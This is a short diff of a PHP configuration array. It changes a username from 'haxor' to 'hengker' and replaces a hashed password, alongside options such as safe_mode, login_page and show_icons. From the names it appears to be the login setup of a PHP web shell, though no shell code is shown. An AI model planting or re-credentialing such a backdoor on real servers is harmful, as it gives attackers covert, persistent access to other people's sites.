@@ -1,8 +1,8 @@
 <?php
 
 $GLOBALS['Mr Q '] = array(
-    'username' => 'haxor',
-    'password' => '7d793037a0760186574b0282f2f435e7',
+    'username' => 'hengker',
+    'password' => '0e46934e49241e706bbf5fbea87773d6',
     'safe_mode' => '0',
     'login_page' => 'gui',
     'show_icons' => '1',
